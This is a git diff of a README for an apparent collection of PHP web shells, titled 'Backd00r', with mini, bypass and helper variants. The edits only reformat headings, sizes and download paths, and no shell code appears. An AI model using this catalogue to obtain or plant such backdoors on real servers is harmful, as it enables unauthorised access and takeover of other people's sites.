@@ -13,7 +13,7 @@ Author: [Adilhyz](https://adilhyz.github.io)
 
 &ensp;[<kbd> <br> Safety Backd00r <br> </kbd>](#safety-backd00r)&ensp;
 &ensp;[<kbd> <br> File Manager <br> </kbd>](#file-manager)&ensp;
-&ensp;[<kbd> <br>Mini Backd00r <br> </kbd>](#mini-backd00r)&ensp;
+&ensp;[<kbd> <br> Mini Backd00r <br> </kbd>](#mini-backd00r)&ensp;
 &ensp;[<kbd> <br> Fully Backd00r <br> </kbd>](#fully-backd00r)&ensp;
 &ensp;[<kbd> <br> Bypass Backd00r <br> </kbd>](#bypass-backd00r)&ensp;
 &ensp;[<kbd> <br> Helper Backd00r <br> </kbd>](#uploader-backd00r)&ensp;
@@ -201,7 +201,7 @@ Author: [Adilhyz](https://adilhyz.github.io)
 - [**Download**](https://adilhyz.github.io/WebShell/PHP/mini/Sindbad.php) | [**Raw**](https://github.com/adilhyz/WebShell/blob/master/PHP/mini/Sindbad.php)
 
 
-### Single ```0Byt3``` Mini Shell
+### ```0byt3``` Mini Shell
 
 [![Obyt3 show](https://adilhyz.github.io/WebShell/preview/single.webp)](https://adilhyz.github.io/WebShell/preview/single.webp)
 
@@ -301,7 +301,7 @@ Author: [Adilhyz](https://adilhyz.github.io)
 - **Size:** 184kb
 - **Version:** -
 - **Password:** -
-- [**Download**](https://adilhyz.github.io/WebShell/PHP/mini/spl.php) | [**Raw**](https://github.com/adilhyz/WebShell/blob/master/PHP/mini/spl.php)
+- [**Download**](https://adilhyz.github.io/WebShell/PHP/spl.php) | [**Raw**](https://github.com/adilhyz/WebShell/blob/master/PHP/spl.php)
 
 ## Bypass Backd00r
 
@@ -332,7 +332,7 @@ Author: [Adilhyz](https://adilhyz.github.io)
 - **Password:** -
 - [**Download**](https://adilhyz.github.io/WebShell/PHP/403/geckobyp.php) | [**Raw**](https://raw.githubusercontent.com/adilhyz/WebShell/master/PHP/403/geckobyp.php)
 
-### 0byt3 Remastered Bypass
+### ```0byt3``` Remastered
 
 [![0byt3 show](https://adilhyz.github.io/WebShell/preview/0byterema.webp)](https://adilhyz.github.io/WebShell/preview/0byterema.webp)
 
@@ -457,7 +457,7 @@ Author: [Adilhyz](https://adilhyz.github.io)
 
 [![Echi show](https://adilhyz.github.io/WebShell/preview/echicmd.webp)](https://adilhyz.github.io/WebShell/preview/echicmd.webp)
 
-- **Size:** 9kb
+- **Size:** **9kb**
 - **Version:** -
 - **Password:** -
 - [**Download**](https://adilhyz.github.io/WebShell/PHP/helper/echicmd.php) | [**Raw**](https://raw.githubusercontent.com/adilhyz/WebShell/master/PHP/helper/echicmd.php)
